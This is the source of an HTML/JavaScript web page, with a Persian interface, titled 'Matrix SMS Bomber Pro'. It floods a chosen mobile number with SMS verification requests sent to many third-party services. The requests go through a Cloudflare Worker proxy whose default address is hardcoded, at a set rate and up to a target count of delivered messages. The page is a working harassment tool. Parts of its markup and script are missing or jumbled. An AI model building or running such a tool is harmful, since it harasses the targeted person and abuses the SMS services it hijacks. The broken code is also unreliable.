<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Matrix SMS Bomber Pro</title>
    <style>
        :root {
            --bg: #0a0a0a;
            --glass: rgba(20, 20, 30, 0.7);
            --border: rgba(0, 255, 65, 0.3);
            --text: #e0ffe0;
            --accent: #00ff41;
            --green: #00ff41;
            --red: #ff3333;
            --radius: 16px;
            --font: 'Segoe UI', 'Vazir', Tahoma, sans-serif;
            --shadow: 0 0 25px rgba(0,255,65,0.2);
        }
        body.light {
            --bg: #f0f4f0;
            --glass: rgba(255,255,255,0.6);
            --border: rgba(0,100,0,0.2);
            --text: #0a0a0a;
            --accent: #0a0;
            --green: #0a0;
            --red: #c00;
            --shadow: 0 0 15px rgba(0,0,0,0.1);
        }
        * { margin:0; padding:0; box-sizing:border-box; }
        body {
            font-family: var(--font);
            background: var(--bg);
            color: var(--text);
            overflow-x: hidden;
            transition: 0.3s;
        }
        #matrixCanvas {
            position: fixed;
            top:0; left:0;
            width:100%; height:100%;
            z-index:0;
            opacity:0.3;
            pointer-events: none;
        }
        .container {
            position: relative;
            z-index: 1;
            max-width: 960px;
            margin: auto;
            padding: 20px;
        }
        .glass-card {
            background: var(--glass);
            backdrop-filter: blur(20px);
            -webkit-backdrop-filter: blur(20px);
            border: 1px solid var(--border);
            border-radius: var(--radius);
            box-shadow: var(--shadow);
            padding: 20px;
            margin-bottom: 20px;
            transition: 0.3s;
        }
        h1 {
            font-size: 2.5rem;
            color: var(--accent);
            text-shadow: 0 0 10px var(--accent);
            margin-bottom: 20px;
            text-align: center;
        }
        .theme-btn {
            position: fixed;
            top: 20px;
            left: 20px;
            z-index: 2;
            background: var(--glass);
            border: 1px solid var(--border);
            color: var(--text);
            padding: 8px 15px;
            border-radius: 20px;
            cursor: pointer;
            backdrop-filter: blur(10px);
        }
        .grid-2 {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 15px;
        }
        @media (max-width: 600px) { .grid-2 { grid-template-columns: 1fr; } }
        label {
            display: block;
            margin-bottom: 5px;
            font-weight: bold;
        }
        input, select {
            width: 100%;
            padding: 12px 15px;
            margin-bottom: 15px;
            background: rgba(0,0,0,0.3);
            border: 1px solid var(--border);
            border-radius: 30px;
            color: var(--text);
            font-family: var(--font);
            font-size: 1rem;
            transition: 0.3s;
            outline: none;
        }
        input:focus { border-color: var(--accent); box-shadow: 0 0 15px var(--accent); }
        button {
            padding: 12px 25px;
            border-radius: 30px;
            border: none;
            font-weight: bold;
            cursor: pointer;
            transition: 0.3s;
            margin: 5px;
        }
        .btn-start { background: var(--green); color: #000; box-shadow: 0 0 20px var(--green); }
        .btn-start:hover { transform: scale(1.05); }
        .btn-stop { background: var(--red); color: #fff; box-shadow: 0 0 20px var(--red); }
        .btn-stop:hover { transform: scale(1.05); }
        .stats {
            display: flex;
            flex-wrap: wrap;
            gap: 10px;
            justify-content: space-around;
        }
        .stat-box {
            background: rgba(0,0,0,0.3);
            border: 1px solid var(--border);
            border-radius: 12px;
            padding: 10px 15px;
            text-align: center;
            flex:1;
            min-width:70px;
            backdrop-filter: blur(5px);
        }
        .stat-label { font-size:0.8rem; opacity:0.8; }
        .stat-value { font-size:1.5rem; font-weight:bold; }
        .progress-outer {
            height: 10px;
            background: rgba(255,255,255,0.1);
            border-radius: 5px;
            margin: 15px 0;
            overflow: hidden;
        }
        .progress-inner {
            height: 100%;
            width: 0%;
            background: var(--accent);
            box-shadow: 0 0 10px var(--accent);
            transition: width 0.3s;
        }
        .log-box {
            background: rgba(0,0,0,0.4);
            border: 1px solid var(--border);
            border-radius: 12px;
            padding: 15px;
            height: 220px;
            overflow-y: auto;
            font-family: 'Courier New', monospace;
            font-size: 0.85rem;
            backdrop-filter: blur(5px);
        }
        .flex-row { display: flex; gap: 10px; align-items: center; flex-wrap: wrap; }
        /* سوئیچ پروکسی */
        .proxy-toggle { display: flex; align-items: center; gap: 10px; margin: 10px 0; }
    </style>
</head>

                    <input type="range" id="rateSlider" min="1" max="20" value="5" oninput="document.getElementById('rateVal').innerText=this.value">

                <div>
                    <label>🎯 پیامک موفق هدف (اختیاری)</label>

                </div>
                <div>
                    <label>🌐 آدرس پروکسی (Cloudflare Worker)</label>
                    <div class="proxy-toggle">

                        <label for="useProxy">فعال</label>
                    </div>
                    <input type="text" id="proxyUrl" placeholder="https://your-worker.workers.dev">

            </div>

            <div class="flex-row">
                <button class="btn-start" onclick="startAttack()">▶ شروع</button>
                <button class="btn-stop" onclick="stopAttack()">⏹ توقف</button>
            </div>

            <div class="stats" style="margin-top:20px;">

                <div class="stat-box"><div class="stat-label" style="color:var(--green)">موفق</div><div class="stat-value" id="success" style="color:var(--green)">0</div></div>
                <div class="stat-box"><div class="stat-label" style="color:var(--red)">خطا</div><div class="stat-value" id="fail" style="color:var(--red)">0</div></div>

                <div class="stat-box"><div class="stat-label">٪ موفقیت</div><div class="stat-value" id="percent">0%</div></div>
            </div>

            <div class="progress-outer"><div class="progress-inner" id="progressBar"></div></div>

            <div class="log-box" id="log">⏳ آمادهٔ عملیات...</div>
        </div>

        const canvas = document.getElementById('matrixCanvas');

        const letters = '01АБВГДЕЖЗИЙКЛМНОПРСТУФХЦЧШЩЪЫЬЭЮЯ';
        const fontSize = 14;
        const columns = canvas.width / fontSize;
        const drops = Array(Math.floor(columns)).fill(1);
        function drawMatrix() {
            ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
            ctx.fillRect(0, 0, canvas.width, canvas.height);
            ctx.fillStyle = getComputedStyle(document.body).getPropertyValue('--accent').trim() || '#0f0';
            ctx.font = fontSize + 'px monospace';
            for (let i = 0; i < drops.length; i++) {
                const text = letters[Math.floor(Math.random() * letters.length)];
                ctx.fillText(text, i * fontSize, drops[i] * fontSize);
                if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
                drops[i]++;
            }
        }
        setInterval(drawMatrix, 40);

            canvas.width = window.innerWidth;

        // ==================== متغیرها ====================
        let stats = { total: 0, success: 0, fail: 0 };
        let stopFlag = false;
        let startTime = 0;
        const logBox = document.getElementById('log');
        const DEFAULT_PROXY = 'https://smsbomber.game-developer-mb.workers.dev'; // ← جایگزین کنید
        document.getElementById('proxyUrl').value = localStorage.getItem('proxyUrl') || DEFAULT_PROXY;

        function log(msg) {
            const time = new Date().toLocaleTimeString('fa-IR');
            logBox.innerHTML += `[${time}] ${msg}\n`;
            logBox.scrollTop = logBox.scrollHeight;
        }

        function updateStats() {
            document.getElementById('total').innerText = stats.total;
            document.getElementById('success').innerText = stats.success;
            document.getElementById('fail').innerText = stats.fail;
            const elapsed = (Date.now() - startTime) / 1000;
            const rate = elapsed > 0 ? (stats.total / elapsed).toFixed(1) : 0;
            document.getElementById('rateDisp').innerText = rate;
            const percent = stats.total > 0 ? ((stats.success / stats.total) * 100).toFixed(1) : 0;
            document.getElementById('percent').innerText = percent + '%';
        }

        async function sendViaProxy(api, phone, proxyUrl) {
            const url = api.url.replace('{phone}', phone);
            const method = api.method || 'GET';
            let body = api.body ? api.body.replace('{phone}', phone) : null;
            const headers = { 'Content-Type': 'application/json' };
            const resp = await fetch(proxyUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ url, method, headers, body })
            });
            if (resp.ok) {
                const data = await resp.json().catch(() => ({}));
                if (data.error || (data.message && /failed|error/i.test(data.message))) return false;
                return true;
            }
            return false;
        }

        class TokenBucket {
            constructor(rate) {
                this.rate = rate;
                this.tokens = 0;
                this.lastTime = Date.now();
            }
            async consume() {
                const now = Date.now();
                this.tokens += ((now - this.lastTime) / 1000) * this.rate;
                this.lastTime = now;
                if (this.tokens > this.rate) this.tokens = this.rate;
                if (this.tokens >= 1) {
                    this.tokens -= 1;
                } else {
                    const wait = ((1 - this.tokens) / this.rate) * 1000;
                    await new Promise(r => setTimeout(r, wait));
                    this.tokens = 0;
                    this.lastTime = Date.now();
                }
            }
        }

        async function runAttack(phone, rate, target, proxyUrl) {
            const bucket = new TokenBucket(rate);
            const tasks = [];
            for (const api of API_TEMPLATES) {
                if (stopFlag) break;
                const capacity = api.capacity || 0;
                if (capacity <= 0) continue;
                for (let i = 0; i < capacity; i++) {
                    if (stopFlag) break;
                    tasks.push(api);
                }
            }
            log(`📋 ${tasks.length} درخواست آماده شد.`);
            for (const api of tasks) {
                if (stopFlag || (target && stats.success >= target)) break;
                await bucket.consume();
                try {
                    const ok = await sendViaProxy(api, phone, proxyUrl);
                    stats.total++;
                    if (ok) {
                        stats.success++;
                        if (stats.success % 10 === 0) log(`✅ موفق از ${api.source}`);
                    } else {
                        stats.fail++;
                        if (stats.fail % 10 === 0) log(`❌ خطا از ${api.source}`);
                    }
                    updateStats();
                    const progress = target ? (stats.success / target * 100) : (stats.total / tasks.length * 100);
                    document.getElementById('progressBar').style.width = Math.min(progress, 100) + '%';
                } catch (e) {
                    stats.total++;
                    stats.fail++;
                    updateStats();
                }
                if (target && stats.success >= target) {
                    log(`🎯 به هدف ${target} رسیدیم. توقف...`);
                    break;
                }
            }
            log(`🏁 پایان. مجموع: ${stats.total} | موفق: ${stats.success} | خطا: ${stats.fail}`);
            document.getElementById('progressBar').style.width = '100%';
            resetButtons();
        }

        function startAttack() {
            const phone = document.getElementById('phone').value.trim();
            if (!/^09\d{9}$/.test(phone)) { alert('شماره موبایل معتبر نیست'); return; }
            const rate = parseInt(document.getElementById('rateSlider').value);
            const targetStr = document.getElementById('target').value.trim();
            const target = targetStr ? parseInt(targetStr) : null;
            const useProxy = document.getElementById('useProxy').checked;
            const proxyUrl = useProxy ? document.getElementById('proxyUrl').value.trim() : null;
            if (useProxy && !proxyUrl) { alert('آدرس پروکسی را وارد کنید'); return; }
            localStorage.setItem('proxyUrl', proxyUrl);
            stats = { total:0, success:0, fail:0 };
            stopFlag = false;
            startTime = Date.now();
            updateStats();
            logBox.innerHTML = '';
            log(`🚀 شروع ارسال به ${phone} با نرخ ${rate} req/s...`);
            document.getElementById('progressBar').style.width = '0%';
            document.querySelector('.btn-start').disabled = true;
            document.querySelector('.btn-stop').disabled = false;
            runAttack(phone, rate, target, proxyUrl);
        }

        function stopAttack() {
            stopFlag = true;
            log('🛑 توقف توسط کاربر');
            document.querySelector('.btn-stop').disabled = true;
        }

        function resetButtons() {
            document.querySelector('.btn-start').disabled = false;
            document.querySelector('.btn-stop').disabled = true;
        }

        function toggleTheme() {
            document.body.classList.toggle('light');
            document.body.classList.toggle('dark');
        }
    </script>
